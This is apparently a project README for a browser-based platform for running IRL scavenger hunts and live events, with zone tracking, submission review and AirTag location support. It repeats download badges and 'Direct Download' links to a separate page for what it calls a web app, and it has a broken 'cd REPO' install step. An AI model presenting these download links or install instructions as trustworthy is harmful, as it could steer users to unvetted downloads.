# The Platform v2026 - IRL game platform 2026

> **A browser-based platform for IRL games in version 2026, built to run scavenger hunts, live events, and team challenges with zone tracking, submission review, and admin tooling.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noah-ross2000/the-platform-v2026?style=flat-square)](https://github.com/noah-ross2000/the-platform-v2026)

---

<p align="center">
  <a href="https://noah-ross2000.github.io/the-platform-v2026/">
    <img src="https://img.shields.io/badge/Download-The%20Platform%20Latest-brightgreen?style=for-the-badge" alt="Download The Platform">
  </a>
</p>

> **[Direct Download - The Platform v2026](https://noah-ross2000.github.io/the-platform-v2026/)**

---

[Download Latest Build](https://noah-ross2000.github.io/the-platform-v2026/)

---

## Overview

The Platform is a web application focused on operating IRL games from one place. Organizers can use it to coordinate scavenger hunts, manage zones and teams, and keep the flow of challenges moving during live events. It is intended for active gameplay, with support for submissions, scoring, and event coordination in a single interface.

For staff, it reduces the need to switch between separate tools while monitoring changing locations, checking team progress, and handling routine admin tasks. Slack notifications, calendar imports, media storage, and location tracking options are all available to help keep event operations together inside a browser-based dashboard.

---

## Capabilities

- Create and manage challenges, zones, houses, and teams
- Review team submissions and approve or reject completions
- Map challenges to zones and support zone stealing
- Run quests and live events with point scoring
- Send Slack notifications for location changes and submission updates
- Store uploaded media in R2
- Import Google Calendar events when needed
- Track locations with AirTag support and browser geolocation fallback

---

## Installation

Clone the repository and open it in your preferred web hosting or development setup:

```bash
git clone https://github.com/noah-ross2000/the-platform-v2026.git
cd REPO
```

From there, deploy or serve the web app using the workflow used by your environment. If you are working locally, open the main entry page in a browser or run your usual static/web preview command.

---

## How to Use

Most day-to-day work happens in the admin dashboard:

1. Sign in with the configured authentication flow.
2. Create teams, zones, houses, and challenges for your event.
3. Assign challenges to locations and monitor progress as teams move.
4. Review incoming submissions and mark completions as approved or rejected.
5. Watch live updates, location changes, and scoring from the dashboard.

For event planning, you can also bring in calendar data, attach uploaded media, and keep staff informed through Slack notifications.

---

## Configuration

Environment-based settings control how the platform behaves in production and during events. Common options include:

```env
HIDE_LIVE_LOCATION_MARKERS=true
USE_R2_STORAGE=true
ENABLE_GOOGLE_CALENDAR_IMPORT=true
ENABLE_SLACK_NOTIFICATIONS=true
ENABLE_AIRTAG_TRACKING=true
ENABLE_BROWSER_GEO_FALLBACK=true
```

Adjust these values to match your event setup, storage choices, and tracking preferences.

---

## Requirements

- Web browser access
- A hosting or deployment environment for the web app
- R2 storage for uploaded media, if enabled
- Slack workspace access for notifications, if used
- Google Calendar access for event imports, if enabled
- Hack Club Auth for authenticated access, if configured
- A device capable of location tracking when using AirTag or browser geolocation features

---

## FAQ

**How do I update The Platform?**  
Download the latest build from the project link above and redeploy it in your environment.

**Where are settings changed?**  
Most behavior is controlled through environment configuration and your deployment setup.

**Can I disable live location markers?**  
Yes, live marker visibility can be controlled through environment variables.

**What if Slack or calendar features are not needed?**  
Those integrations can be left off if they are not part of your event workflow.

**Where should I look if something is not working?**  
Check your environment values, storage setup, and any connected service credentials first.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
